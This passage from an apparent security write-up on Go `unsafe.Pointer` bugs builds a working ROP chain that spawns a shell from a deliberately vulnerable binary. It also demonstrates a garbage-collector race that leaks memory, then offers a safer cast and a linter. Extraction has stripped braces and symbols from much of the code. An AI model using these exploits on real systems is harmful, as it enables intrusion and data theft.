        000000c000070f88:  000000000042ebd2 <runtime.throw+114>  000000c000070fa8
        000000c000070f98:  000000c000070fc8  000000000042ebd2 <runtime.throw+114>
        000000c000070fa8:  000000c000070fb0  0000000000458500 <runtime.throw.func1+0>
        000000c000070fb8:  00000000004c1077  0000000000000005
        000000c000070fc8:  000000c000070ff8  00000000004429dc <runtime.sigpanic+972>
        000000c000070fd8: <00000000004c1077  0000000000000005
        000000c000070fe8:  0000000000000000  000000c000072000
        000000c000070ff8:  0000000000000000
        runtime.sigpanic()
        /usr/lib/go/src/runtime/signalunix.go:694 +0x3cc fp=0xc000071008 sp=0xc000070fd8 pc=0x4429dc


        Quite obvious from the big stack trace, we see that the program crashed. But more importantly, we see the win! output
        right at the top, which means that the win function was indeed executed. We don't actually care about the program
        crash, the objective was to decide which code should be executed and this was successful!



%% -----------------------------------------------------------------------------

        \section{Part 3}

        Executing code on the stack

        Following the last part of the series, you might have thought: what if we pipe actual machine instructions into the
        program, and then use the address of this machine code on the stack (inside the buffer receiving the input data) instead
        of the address of the win function. This way, we could execute arbitrary code of our choice, including just spawning
        a shell and thus having a universal interface to run more code.

        Indeed, this was possible not too much time ago. One would send the padding necessary to fill up the input buffer and
        stack up to the stored return pointer, then an address a bit later in the stack, and then the machine code needed to
        start a shell. If the padding was long enough, it would also be possible to put the code into the padding, reducing the
        overall input data size.

        Because the stack is always a bit unpredictable (for example, environment variables might get pushed onto the stack and
        they could be different on each program run), the exact address of the shell code could vary slightly. And if we would
        miss it by even a byte, the code would become corrupted and stop working.

        To mitigate this, we could send a lot of NOP instructions (opcode 0x90 [[2]](references)) between the address and the shell code, and
        then try to jump into the middle of those instructions. This way, we don't have to hit the exact correct byte, instead
        the exploit also works if we jump to an address that is a few bytes before or after. This is because all possible
        target addresses (within some range) would be NOP instructions, and the CPU would just follow along all NOP
        instructions until it reaches the shell code and executes it. This technique is called the nop slide [[3]](references), because the CPU in
        a way slides down a slope of NOPs.

        The payload that we would inject could look like this:

        ![Nop Slide Inject Payload](assets/payload.svg)


        DEP and ASLR: mitigations against buffer overflows

        Unfortunately, these days it isn't quite that easy anymore. Operating system developers have done a lot of work to
        implement countermeasures against this simple code-on-the-stack exploit.

        Data Execution Prevention [[7]](references) is a technique which assigns different permissions to the memory pages used by a program. There
        are pages that can only be read (like literals and constants), pages that can be read and executed (like the program
        instructions itself) and pages that can be written (e.g. the stack or heap). But the pages that can be written to can
        not be executed! Different names for this are RW (read xor write) or NX (Non-eXecutable memory). This technique has been in
        use by all major operating systems for years, and it effectively prevents us from writing our code onto the stack and
        then executing it.

        Another mitigation is Address Space Layout Randomization (ASLR) [[1]](references), which randomizes the addresses of dynamically linked
        libraries, or maybe even functions inside the binary itself, when loading it into the RAM. This way, we can not use GDB
        to analyze the binary locally and determine addresses where we might jump to, because on the exploit target (possibly
        remote) the addresses would be completely different.

        Fortunately for this proof of concept, Go does not really use ASLR. The binaries produced by the Go compiler have
        deterministic addresses, and at least this small program gets statically linked so there are no dynamic libraries that
        could be loaded at different addresses. We can see this by running some analysis on the binary file:

        shell
        readelf -l main

        Elf file type is EXEC (Executable file)
        Entry point 0x45d310
        There are 7 program headers, starting at offset 64

        Program Headers:
        Type           Offset             VirtAddr           PhysAddr
        FileSiz            MemSiz              Flags  Align
        PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040
        0x0000000000000188 0x0000000000000188  R      0x1000
        NOTE           0x0000000000000f9c 0x0000000000400f9c 0x0000000000400f9c
        0x0000000000000064 0x0000000000000064  R      0x4
        LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
        0x00000000000926ad 0x00000000000926ad  R E    0x1000
        LOAD           0x0000000000093000 0x0000000000493000 0x0000000000493000
        0x00000000000bd151 0x00000000000bd151  R      0x1000
        LOAD           0x0000000000151000 0x0000000000551000 0x0000000000551000
        0x0000000000015240 0x00000000000414c8  RW     0x1000
        GNUSTACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
        0x0000000000000000 0x0000000000000000  RW     0x8
        LOOS+0x5041580 0x0000000000000000 0x0000000000000000 0x0000000000000000
        0x0000000000000000 0x0000000000000000         0x8

        Section to Segment mapping:
        Segment Sections...
        00
        01     .note.go.buildid
        02     .text .note.go.buildid
        03     .rodata .typelink .itablink .gosymtab .gopclntab
        04     .go.buildinfo .noptrdata .data .bss .noptrbss
        05
        06

        ldd main
        the program is not dynamically linked



        Return2libc

        But wait - didn't we in fact execute code in the last part of the series? Yes, we did! But it was code that was already
        contained in the binary. We executed the win function that was compiled into the binary. This means that we didn't
        jump to code that was on the stack (an RW-page), but instead we jumped into the .text segment of the program where all
        the other machine instructions live, too (an RX-page).

        By reusing code that is already in the binary, we can defeat Data Execution Prevention.

        A generalization of this technique is called return2libc, where we would now jump to a function contained in the huge
        C standard library libc. We could e.g. use the system function that allows us to execute arbitrary commands. However,
        as mentioned before the binary produced by the Go compiler is statically linked, and it doesn't link against the libc
        C library. Thus, we cannot use return2libc. And even if it were linked against libc, ASLR would do a decent job at
        making it very hard to find out the correct addresses of libc functions.


        Return oriented programming

        We need a different approach: Return Oriented Programming (ROP). With ROP, we try to jump into code that is contained
        in the binary just as with return2libc, but we jump to a location that contains preferably only one or at most a few
        machine instructions and a return instruction.

        Recall that the return instruction ret actually is a simple pop rip. This means that if we execute ret, and then
        another ret, we will simply fetch the next processor word from the stack and jump to that address. Now, this enables
        us to chain together small pieces of code by putting the addresses of these code snippets on the stack, one after
        another. The important requirements for this are that the code snippets end with a ret instruction, and do not modify
        the stack pointer rsp, because modifying the stack pointer would destroy our chain of code snippets. Using these
        snippets, we can craft a program almost like manually coding in assembly, but with only a limited set of assembly
        instructions available (the ones we find in the binary).

        With these code snippets, we can do arbitrary stuff, including calling syscalls. Syscalls give us the power to e.g.
        read data into a buffer, or change the execution permissions of memory pages used by the program.

        To find suitable code snippets, we can either manually decompile the complete binary (very tedious), or use a helper
        tool like ROPgadget or Ropper. I used Ropper here:

% github sashs/Ropper no-readme %

        We analyze the short Go program known from the last part:

        go
        // initialize the reader outside of the main function to simplify POC development, as there are less local variables
        // on the stack.
        var reader = bufio.NewReader(os.Stdin)

        func main()
        // this is a harmless buffer, containing some harmless data
        harmlessData := [8]byte'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A'

        // create a slice of length 512 byte, but assign the address of the harmless data as its buffer.
        // use the reflect.SliceHeader to change the slice
        confusedSlice := make([]byte, 512)
        sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(confusedSlice))
        harmlessDataAddress := uintptr(unsafe.Pointer((harmlessData[0])))
        sliceHeader.Data = harmlessDataAddress

        // now read into the confused slice from STDIN. This is not quite as bad as a gets() call in C, but almost. The
        // function will read up to 512 byte, but the underlying buffer is only 8 bytes. This function is the complete
        // vulnerability, nothing else needed
        ,  = reader.Read(confusedSlice)



        The following command shows quite a lot of ROP gadgets (snippets) that are contained in our binary:

        shell
        ropper --file main --search "%"
        0x000000000041996b: adc al, 0; ret;
        0x000000000042dee5: adc al, 0x1f; mov dword ptr [rsp + 0x28], edx; mov qword ptr [rsp + 0x30], rax; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret;
        0x000000000042da80: adc al, 0x24; call 0x2d660; mov rbp, qword ptr [rsp + 0x40]; add rsp, 0x48; ret;
        0x000000000044ba26: adc al, 0x24; call 0x4b190; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret;
        0x000000000046c199: adc al, 0x24; call 0x6bec0; mov rbp, qword ptr [rsp + 0x10]; add rsp, 0x18; ret;
        0x000000000046bffa: adc al, 0x24; call 0x6bec0; mov rbp, qword ptr [rsp + 0x28]; add rsp, 0x30; ret;
        0x00000000004614fa: adc al, 0x24; call rcx;
        [...]


        Ropper even provides some automated search tools, but in this specific case they couldn't automatically find a complete
        exploit chain, so I had to dig in using my own hands.


        POC: Spawning a shell

        Putting the ROP techniques from above into play, the plan looks like this:

        1. Set the executable and writable flags for a memory page belonging to the program
        2. Write some code that spawns a shell into the page
        3. Jump to that code

        The following steps are based on the excellent blog articles [[4, 5, 6]](references). Give them a read for even more details on ROP
        chains and exploit development.


        **Step 1: Get a memory page with RWX permissions**

        To do this, we use the mprotect syscall. Its man page explains the usage:

        c
        int mprotect(void *addr, sizet len, int prot);

        mprotect() changes the access protections for the calling process's memory pages containing any part of the address
        range in the interval [addr, addr+len-1]. addr must be aligned to a page boundary.


        This means we need to provide the address of the region we want to change, the desired size, and the permission to set.
        These permissions work similar to file system permissions, so the integer value 7 means RWX.

        I use the Python Exploit Development Assistance (PEDA) for GDB. Follow the instructions on the
        [PEDA project page](https://github.com/longld/peda) to install it.

        With it, we can use the vmmap command in GDB PEDA to find a suitable memory page:

        gdb
        gdb-peda vmmap
        Start              End                Perm	Name
        0x00400000         0x00493000         r-xp	main
        0x00493000         0x00551000         r--p	main
        0x00551000         0x00567000         rw-p	main
        0x00567000         0x00593000         rw-p	[heap]
        [...]


        The first (r-x) page is the one containing the code. I choose the third page, starting at 0x00551000. It already has
        the RW permissions, but we need to add X to make it executable. We can choose 0x100 (256 bytes) as size as this will
        be more than enough space for the shell code.

        How do syscalls work? The general idea is to execute the syscall instruction. Before that, we need to put the syscall
        number into rax, and set up the arguments to the function. The [Linux x8664 syscall table](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall64.tbl)
        shows that the mprotect syscall has number 10 (0xa).

        We set up the parameters according to the x8664 calling convention: the first parameters get passed in registers rdi,
        rsi, rdx, rxc, r8, r9, the remaining ones through the stack. The return value is passed back in rax. This means
        that we will need to set up the following situation when executing the syscall instruction:

        - rax: 0xa
        - rdi: 0x00551000
        - rsi: 0x100
        - rdx: 0x7

        For this, we now need to find some suitable gadgets in the huge output of Ropper. First, let's try to set rax to 10.
        There is probably no mov rax, 10, so instead what could be useful is a mov rax, 0 / sub rax, rax / xor rax, rax
        to set rax to zero, and then add rax, 1 to slowly increase it up to 10.

        I could find a mov eax, 0; ret; gadget at address 0x000000000045b900 and debugging in GDB showed that this is indeed
        enough to set the whole rax to zero (eax is the lower 32 bit of the 64 bit register rax). Then, combining it with the
        add rax, 2; mov dword ptr [rip + 0x14d61f], eax; ret; gadget applied 5 times we can increment rax to 10. The gadget
        will also move the eax value to some address in memory but we can just ignore that.

        For rdx and rsi, we can go the easy way and just pop them from the stack, meaning we just put the pop gadget and the
        value directly behind it. Very convenient. The gadgets look like this: pop rdx; adc al, 0xf6; ret;. They also
        increment rax through the adc instruction, but if we set up rdx and rsi before setting up rax this is not a
        problem because we initialize it to zero anyways.

        For setting rdx, I also found pop rdx; xor ah, byte ptr [rsi - 9]; ret;. We could apply it twice to change back the
        xor operation on rax, but this gadget reads from an address determined through rsi which will segfault in this
        context.

        The hardest is finding a gadget to set rdi. There is pop rdi; sete byte ptr [rsp + 0x10]; ret;, but this will set
        a memory address near the stack pointer with the second instruction and thus mess up the ROP chain. The only other good
        gadget option is pop rdi; dec dword ptr [rax + 0x21]; ret;,  but this decrements a memory address determined by rax.
        In theory, we don't need to care about this address, but in my experiments the address would always be invalid and
        thus crash the program too early.

        I found a solution using the pop rax; or dh, dh; ret; gadget. It allows to set rax directly and therefore also makes
        the above rax increment workaround unnecessary. I leave it in anyways. The important part is, we can now set rax to
        some dummy address before executing the pop rdi gadget, and then the program does not crash. I use the address of the
        fourth memory page from above, the heap, for this: 0x00567000.

        Finally, we need the syscall instruction itself. Fortunately, this is straightforward as there is a syscall; ret;
        gadget.

        Now we can put together the gadget addresses and values. Before them, we put the same padding to offset to the stored
        return address on the stack. I use the Python pwntools to have some more convenient functions in the exploit script.

        python
        eax0 = 0x000000000045b900  mov eax, 0; ret;
        inc2rax = 0x0000000000419963  add rax, 2; mov dword ptr [rip + 0x14d61f], eax; ret;
        poprdx = 0x000000000040830c  pop rdx; adc al, 0xf6; ret;
        poprsi = 0x0000000000415574  pop rsi; adc al, 0xf6; ret;
        syscall = 0x000000000045d329  syscall; ret;
        poprax = 0x000000000040deac  pop rax; or dh, dh; ret;
        poprdi = 0x000000000040eb97  pop rdi; dec dword ptr [rax + 0x21]; ret;

        addresses
        buf = 0x00551000  use vmmap in GDB to find it
        dummy = 0x00567000  heap

        padding
        payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"

        mark memory page at buf rwx
        payload += p64(poprax)  sete in poprdi mitigation
        payload += p64(dummy)
        payload += p64(poprdi)  1ST ARGUMENT
        payload += p64(buf)  ADDRESS
        payload += p64(poprsi)  2ND ARGUMENT
        payload += p64(0x100)  SIZE
        payload += p64(poprdx)  3RD ARGUMENT
        payload += p64(0x7)  RWX
        payload += p64(eax0)  SET RAX = 0
        payload += p64(inc2rax) * 5  SET RAX = 10
        payload += p64(syscall)  SYSCALL


        Executing the program with this input will mark the memory page with RWX permissions. We can verify this in GDB using
        the vmmap command:

        gdb
        gdb-peda vmmap
        Start              End                Perm	Name
        [...]
        0x00551000         0x00567000         rwxp	main
        [...]



        **Step 2: Write shell code into the page**

        To read in the shell code, we use the read syscall. Its documentation states the following:

        c
        ssizet read(int fd, void *buf, sizet count);

        read() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.


        We can use the same technique to spawn the syscall as above. The syscall table shows that this time we need to call
        the syscall with number 0. The file descriptor for standard input also has the number 0. Thus, we need to create the
        following register situation:

        - rax: 0x0
        - rdi: 0x0
        - rsi: 0x00551000
        - rdx: 0x100

        Conveniently, we already have the ROP gadgets needed and only need to rearrange:

        python
        payload += p64(poprax)  sete in poprdi mitigation
        payload += p64(dummy)
        payload += p64(poprdi)  1ST ARGUMENT
        payload += p64(0x0)  STDIN
        payload += p64(poprsi)  2ND ARGUMENT
        payload += p64(buf)  ADDRESS
        payload += p64(poprdx)  3RD ARGUMENT
        payload += p64(0x100)  SIZE
        payload += p64(eax0)  SET RAX = 0
        payload += p64(syscall)  SYSCALL



        Now, we have to provide some code that actually spawns a shell. This 27 bytes assembly program will spawn /bin/sh. It
        is taken from [shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-806.php).

        python
        http://shell-storm.org/shellcode/files/shellcode-806.php


        We send it right after the payload in the resulting python script.


        **Step 3: Jump to the code**

        Running the code we just read in is as simple as jumping to it. And jumping to it means we only have to provide its
        address as the next return address:

        python
        payload += p64(buf)


        If we run the final exploit, we get the following output:

        shell
        johannes@host-pc ~  ./exploitrop.py
        [+] Starting local process './main': pid 75369
        [*] Switching to interactive mode
        id
        uid=1000(johannes) gid=1000(johannes) groups=1000(johannes),54(lock),1001(plugdev)



        We have successfully spawned and control a shell. It runs in the same context as the program did, that is the user
        context here. In a next step, we could try to run a local root exploit to escalate privileges.



%% -----------------------------------------------------------------------------

        \section{Part 4}

        Garbage Collection

        First, let's quickly go through garbage collection. Go offers memory management to the programmer. It automatically
        allocates memory for object instances or values, such as integers, slices, or structs. It also keeps track of whether
        those objects are still in use, and frees the memory when they aren't anymore.

        The Go garbage collector runs in the background as its own Goroutine. In fact it's several Goroutines. The garbage
        collector can be triggered manually by calling runtime.GC(), but usually it runs automatically when the heap doubles
        its size. This size threshold can be adjusted with the GOGC environment variable. It is set to a percentage. The
        default is 100, meaning the heap has to grow by 100% to trigger the garbage collection. Setting it to 200 for example
        would mean that the collection is only started when the heap has grown to three times the previous size. On top of the
        size condition there is also a timing condition: as long as the process is not suspended, the garbage collector will run
        at least once every two minutes.

        Go uses a [Mark-and-Sweep garbage collector](https://en.wikipedia.org/wiki/Tracinggarbagecollection). This type of
        garbage collection consists of two phases:

        1. Mark: by recursively following all references, starting from variables in scope, reachable heap objects are marked
        2. Sweep: objects that are not marked are freed

        These steps can be seen in the following figure:

        ![Mark and Sweep Garbage Collection](assets/gc.png)

        The light blue boxes in the heap are objects that are reachable (through the references shown by the arrows). The white
        objects are unreachable and will be freed in the sweep phase.


        Explicit casting using unsafe pointers

        Now, we will look at the most common usage pattern for unsafe.Pointer in real-world open-source Go code: casting a
        slice of some type or string into a slice of some other type. Let's say we wanted to convert a string to a []byte
        slice in-place, that is reusing the string memory instead of copying it into a new slice allocation.

        A frequent pattern to do this looks like this:

        go
        func unsafeStringToBytes(s *string) []byte
        sh := (*reflect.StringHeader)(unsafe.Pointer(s))
        sliceHeader := reflect.SliceHeader
        Data: sh.Data,
        Len:  sh.Len,
        Cap:  sh.Len,

        return *(*[]byte)(unsafe.Pointer(sliceHeader))



        The function gets a *string pointer (sometimes it will also be a direct string) and returns a []byte slice. Let's
        look at what it does, line by line.

        First, a reflect.StringHeader is created from the string. The StringHeader is Go's internal representation of a
        string. It is very similar to the reflect.SliceHeader that we saw in the previous posts of this series:

        go
        type StringHeader struct
        Data uintptr
        Len  int



        The only difference is that there is no Cap field. In fact, strings in Go are by most means just a read-only []byte
        slice. There are some differences, for example that range will iterate over runes instead of bytes, where a rune is
        a Unicode code point. Because strings in Go are encoded in UTF-8, a Unicode code point might need multiple bytes (like
        the German umlaut ), and in that case range will read multiple bytes in one iteration. But in other ways, like the
        length, strings behave like []byte slices. For example, len("") is 2, even if the string has only one character.
        You can read more on this topic in the [Go strings documentation](https://blog.golang.org/strings).

        When we have a variable of type string in Go, it points to a reflect.StringHeader structure, which in turn has a
        pointer to the underlying byte-array holding the string data in its Data field. To get the StringHeader, we cast
        it from an unsafe.Pointer which in turn is created by casting the string pointer. If the function would have received
        a string instead of *string, we would have needed to do unsafe.Pointer(s) here, but the rest would stay the same.

        Now, a *reflect.SliceHeader is created from scratch, by a composite literal. The Data and Len fields are just
        copied from the StringHeader, and Cap is set to the same value as Len.

        Lastly, we cast the *reflect.SliceHeader into a *[]byte, again using an intermediate unsafe.Pointer object. The
        *[]byte is dereferenced and returned.

        Thus the function is casting a string into a []byte object.


        First problem: implicit read-only slices

        Remember that the Go documentation said that strings
        are **read-only** []byte slices? Well, that could turn into a problem here! The []byte object returned by the
        function is not read-only anymore, so the compiler will not complain if we modify its contents:

        go
        func main()
        s := "Hello"
        b := unsafeStringToBytes(s)

        b[1] = "a" // this will crash

        fmt.Println(b)



        The reason strings are read-only is because when we create a string like in the example above, the actual string literal
        (the Hello data) is placed in a special section in the binary file produced by the compiler. When the program is run,
        this section is probably mapped into a read-only memory page. Therefore, the Data field in the StringHeader and
        SliceHeader structures will contain an address inside that read-only page.

        If we now change the slice with b[1] = "a", we attempt to change a read-only memory page. The operating system will
        prevent this and the result is a SIGSEGV segmentation fault, crashing the program.

        The fact that this is a memory access violation that the compiler will not notice since we skipped its checks when we
        used unsafe.Pointer is unfortunate, but a careful programmer could in theory make sure that all usages of the unsafe
        cast function will never change the resulting slice. At all. I think this is a pretty dangerous assumption to make and
        sooner or later there will be a programmer adding code that changes the slice. Therefore the casting pattern above
        should be avoided at all costs.

        But there is a second, much more subtle and dangerous problem in the code above.


        Garbage collector race introduced by slice and string header literals

        Rule 6 of the [unsafe package documentation](https://golang.org/pkg/unsafe/) specifically states that "A program
        should not declare or allocate variables of these struct types." Why is that?

        When the garbage collector runs the mark phase, it follows pointer references to recursively mark the objects referenced
        by the pointer. An unsafe.Pointer and the address stored in the Data field of a valid StringHeader or SliceHeader
        will do the same. This means that sh.Data in the unsafe function above will in fact be treated as a reference value,
        therefore the garbage collector will not free the underlying array.

        However, plain uintptr and invalid slice or string header values are not treated as references.

        Whenever the address of a value is only stored in variable of type uintptr (not additionally in any pointer types),
        the garbage collector will not mark the referenced object and therefore free it. The freed memory might be reused with
        new variables, or the memory page might simply be unmapped, or anything else might happen. Importantly, objects that are
        only reachable by using an address that was stored in a uintptr variable must be treated as gone.

        Unsafe usage rule 2 states that only a "conversion of an unsafe.Pointer to a uintptr (but not back to Pointer)"
        is allowed. The part in parenthesis is important. If we create an unsafe.Pointer object from a previously stored
        uintptr value, that unsafe.Pointer is a potentially dangling pointer, and dereferencing is not a safe operation!

        There are some cases where unsafe.Pointer objects are created from pointer arithmetic on uintptr values, but those
        calculations must happen in the same statement as creating the pointer. We must never store a reference to something
        only in a uintptr value.

        Now, let's revisit the code example above.

        go
        func unsafeStringToBytes(s *string) []byte
        sh := (*reflect.StringHeader)(unsafe.Pointer(s))
        sliceHeader := reflect.SliceHeader
        Data: sh.Data,
        Len:  sh.Len,
        Cap:  sh.Len,


        // At this point, s is no longer used. There is a copy of the address of
        // its underlying array in sliceHeader.Data however, and since sliceHeader
        // was not created from an actual slice, the GC does not treat the address
        // as a reference. Therefore, if the GC runs here it will free s.

        return *(*[]byte)(unsafe.Pointer(sliceHeader))



        At the point of the comment, the garbage collector can potentially run. Remember that it is triggered by heap usage
        growth, and runs concurrently. If the function is used within a program that uses several Goroutines, the garbage
        collector can essentially trigger at any point, including the one with the comment.

        When it runs, it will free string s because it is no longer used. When the []byte slice is created in the next line,
        its Data field will contain an invalid address. It might now point to an unmapped memory page, or simply to some
        undefined position in the heap that might get reused later on.


        PoC: Exploiting this GC race condition

        To see what can happen with this, let's look at the following proof-of-concept code. First, I add the following line
        at the position of the comment above:

        go
        time.Sleep(1 * time.Nanosecond)


        This just makes the exploit a bit more reliable, but is not strictly needed. Next, I add a Goroutine that will just use
        up more and more heap and constantly drop the references to that allocated memory. This will regularly trigger the
        garbage collector.

        go
        func heapHeapHeap()
        var a *[]byte
        for
        tmp := make([]byte, 1000000, 1000000)
        a = tmp
        = a




        Finally, the main Goroutine does the following:

        go
        reader := bufio.NewReader(os.Stdin)
        count := 1
        var firstChar byte

        for
        s,  := reader.ReadString('n')
        if len(s) == 0
        continue

        firstChar = s[0]

        // HERE BE DRAGONS
        bytes := unsafeStringToBytes(s)

        ,  = reader.ReadString('n')

        if len(bytes) > 0  bytes[0] != firstChar
        fmt.Printf("win! after d iterationsn", count)
        os.Exit(0)


        count++



        It initializes a reader to read data from stdin. Then it repeatedly reads two lines from it in a loop. A counter is
        used to count how many loops are needed to succeed. The firstChar variable is set to the first char from the first
        line that is read.

        Then, the first line (a string) is converted to a []byte slice using the unsafe casting function from above. At this
        point, bytes and s should be the same string. Particularly, the bytes[0] should equal firstChar.

        After the conversion, the second line is read. The result from ReadString is not even used, but the important part of
        this is that if the garbage collector was run inside unsafeStringToBytes, then ReadString will reuse the heap space
        that was previously freed.

        Lastly, we check if bytes[0] is actually equal to firstChar, and if it is not we have successfully created a data
        confusion by exploiting a garbage collector race condition. The number of loop executions needed is printed at the end.

        Running this program can have two different results:

        1. The garbage collector finds an incorrect address in the heap and crashed the program with a hint to a possible
        incorrect usage of unsafe.Pointer
        2. It succeeds with the win! message

        As long as the garbage collector does not trigger at the critical point in the unsafe cast function, the loop will just
        run forever.

        The first, crashing case happens when the garbage collector triggers inside the unsafe cast function, and again within
        the second ReadString call in the PoC code. At that point, bytes will be a seemingly valid []byte slice, but its
        Data field will point to previously freed memory.

        The second, succeeding case will happen if the garbage collector triggers only inside the unsafe cast function. In that
        case, the bytes slice will be a dangling slice pointing into the freed heap. Then, the second ReadString will reuse
        that heap space, and provided that we sent a different string as second line, the first byte in the bytes slice will
        now be a different character.

        To achieve the alternating, but infinite input data I use the following Python script:

        python
        !/usr/bin/env python3

        import errno
        from signal import signal, SIGPIPE, SIGDFL
        signal(SIGPIPE,SIGDFL)

        try:
        while True:
        print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
        print("BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")
        except Exception:
        pass


        It simply sends alternating A and B lines, and ignores IO exceptions caused by the pipe closing abruptly when the
        Go program crashes (which would spam the terminal with some Python error messages).

        The PoC is run like this:

        shell
        ./exploit.py | ./main
        win! after 51446 iterations


        In my experiments, the program would crash with condition 1 about 10% of the time, and succeed in 20,000 to 100,000
        iterations otherwise.


        Why is this a problem? A threat model

        Now, all of this might seem rather staged and a succeeding memory confusion after 50,000 iterations on average might not
        seem that often either. But in fact this is probably the most dangerous vulnerability of the ones shown in this blog
        series.

        First, the function that contains the actual vulnerability, unsafeStringToBytes, is taken from real-world Go code.
        There are hundreds of times this code pattern is used in open-source Go libraries, and taking into account that they
        are reused across multiple projects, there are actually tens of thousands of times this is used in the 500 most starred
        open-source Go projects.

        Unlike in part 3 of this series, we didn't gain remote code execution with this exploit PoC. We didn't even violate the
        read-only nature of the slice returned from unsafeStringToBytes. And the exploit is not even particularly reliable, it
        takes thousands of iterations until the confusion happens once and sometimes the program even just crashes. Lastly, we
        added the nanosecond sleep, further increasing the likelihood of the confusion to happen.

        But risk is a combination of likelihood and impact, and the impact of this problem is potentially disastrous.

        First, let's create a potential real-world use case for analysis, set the likelihood in perspective, and then talk
        about the impact. Imagine a server application written in Go. It handles incoming requests, does some internal
        calculations and creates an output that is sent back to the client. Of course the application holds some private state,
        imagine credentials to the database backend or private key data for example. Let's also say that there are 1,000
        requests coming in each second. That number of requests is not low, but also not extremely high.

        Let's ignore the case of crashing the program for now, since for this threat model assessment we can just assume that
        if the server application crashes, some daemon supervisor will just restart it. We can think of the loop in the exploit
        proof of concept as a similar thing to the requests that are coming in. Some code path will be executed for every
        request, and this will be kind of like a loop iteration. Furthermore, if we get a memory confusion every 50,000 requests,
        that will add up to a bit more than one confusion per minute. The nanosecond sleep will make the confusion more likely,
        but still this might occur every few minutes.

        Now, if such a memory confusion happens, there might be some read-only slice that contains unexpected data. If the
        server application happens to use that slice for creating the response output that is sent to the user, even with some
        intermediate conversions in between, the application might server unexpected memory contents back to the user. So with
        this vulnerability in place, a user might suddenly, and randomly, get some scrambled data instead of an HTML response,
        and if that user were to look into the data they might find the application secrets. This is a clear information leak
        vulnerability, and the fact that it is caused by widely used code makes it very dangerous.


        The "correct" way of in-place slice casting using the unsafe package

        There is a "correct" way to cast slices without copying. Whether this is really worth it has to be decided in the
        special case, but we can at least propose a safer version of the vulnerable casting function above.

        go
        func saferStringToBytes(s *string) []byte
        // create an actual slice
        bytes := make([]byte, 0, 0)

        // create the string and slice headers by casting. Obtain pointers to the
        // headers to be able to change the slice header properties in the next step
        stringHeader := (*reflect.StringHeader)(unsafe.Pointer(s))
        sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(bytes))

        // set the slice's length and capacity temporarily to zero (this is actually
        // unnecessary here because the slice is already initialized as zero, but if
        // you are reusing a different slice this is important
        sliceHeader.Len = 0
        sliceHeader.Cap = 0

        // change the slice header data address
        sliceHeader.Data = stringHeader.Data

        // set the slice capacity and length to the string length
        sliceHeader.Cap = stringHeader.Len
        sliceHeader.Len = stringHeader.Len

        // use the keep alive dummy function to make sure the original string s is not
        // freed up until this point
        runtime.KeepAlive(s)  // or runtime.KeepAlive(*s)

        // return the valid bytes slice (still read-only though)
        return bytes



        This is a rather complicated process, but here are the important parts:

        1. The bytes slice that will be returned at the end is created as an actual, valid slice using the make function.
        It is not created by casting a plain header structure that was created as a composite literal. This ensures that
        Go will treat the address stored in sliceHeader.Data as if it were a "real" pointer
        2. Subsequently, the sliceHeader instance is created by casting as stated in the unsafe documentation
        3. sliceHeader length and capacity are explicitly set to zero while the Data address still points to the old
        underlying array. This is only necessary if the slice has not just been created. Decreasing the length and capacity
        is a safe operation, and it ensures that if the garbage collector runs just after the switch of Data it will not
        run past the slice end. This is explained in further detail below.
        4. The StringHeader fields are copied in this order: Data, then Cap, then Len
        5. Using runtime.KeepAlive, we tell the garbage collector that the original string s should not be freed up until
        this point. This ensures that the underlying data array will not be freed before it is referenced by the
        bytes slice.

        When setting the Data field, the slice length and capacity should be zero as noted in point 3. This is because if the
        target slice has a length greater than the source slice / string, and the garbage collector triggers right after
        changing the Data field but before adjusting the Len and Cap fields, the slice would momentarily reach into
        invalid memory. When the slice is of a type containing references, such as a struct, the garbage collector must go
        through the slice to recursively mark the referenced objects, and if the length is set too high it will do so on invalid
        memory. If the length is just zero, this won't happen. However, in order to ensure the referenced objects itself are not
        freed it is imported to still have them referenced by the original slice / string. This is ensured by the call to
        runtime.KeepAlive as stated in point 5.

        Setting Len after Cap ensures that the slice never has a capacity lower than its length, which would be an illegal
        state.

        The takeaway of this should be that it is very very difficult to get this cast right and safe, and therefore this type
        of in-place cast should better not be used at all.


        Introducing a static code analysis tool!

        Unfortunately, the go vet -unsafeptr will not catch this common type of unsafe.Pointer misuse. I developed a Vet-style
        analysis pass that is able to catch it:

% github jlauinger/go-safer no-readme %

        This linter / static code analysis tool will catch the following situations:

        1. There is a reflect.StringHeader or reflect.SliceHeader composite literal. It might also be contained within
        another composite literal.
        2. There is an assignment to the fields of a composite object of type reflect.StringHeader or reflect.SliceHeader,
        and that object is not definitely derived by cast.

        The first situation is fairly easy to detect and almost always unsafe. The linter tool will catch type aliases too. That
        is, if you define

        go
        type MysteryType reflect.SliceHeader


        and then do

        go
        source := make([]byte, 1, 1)
        myHeader := MysteryTypeLen: 42, Cap: 42, Data: uintptr(unsafe.Pointer(source))


        the linter will catch the MysteryType composite literal just as if it were a direct SliceHeader literal.

        The second situation is more difficult. It analysis all assignments and uses the same mechanism to catch type aliases
        for the object receiving the assignment as well. To determine whether it is a safe header derived from a cast, the pass
        depends on the ctrlflow pass, receiving the control flow graph for the package. It finds the function containing the
        assignment. Then, starting from the assignment the linter follows the graph backwards to the last assignment to the
        object of SliceHeader or StringHeader type, and determines if that assignment is a cast from unsafe.Pointer, which
        in turn itself is cast from a slice or string.

        This means it will catch situations like these:

        go
        type MysteryStruct struct
        MysteryHeader reflect.SliceHeader


        func main()
        myStruct := MysteryStruct
        myStruct.MysteryHeader.Len = 42



        The linter will figure out that the SliceHeader instance contained within the MysteryStruct has not been set by a
        cast and issue a warning.






%% former chapter 6


%% -----------------------------------------------------------------------------

\section{Dependency analysis in Rust with Cargo Geiger}\label{sec:cargo-geiger}

Cargo Geiger is the template for the Go dependency check tool.
It does the same thing for the Rust programming language.


%% -----------------------------------------------------------------------------

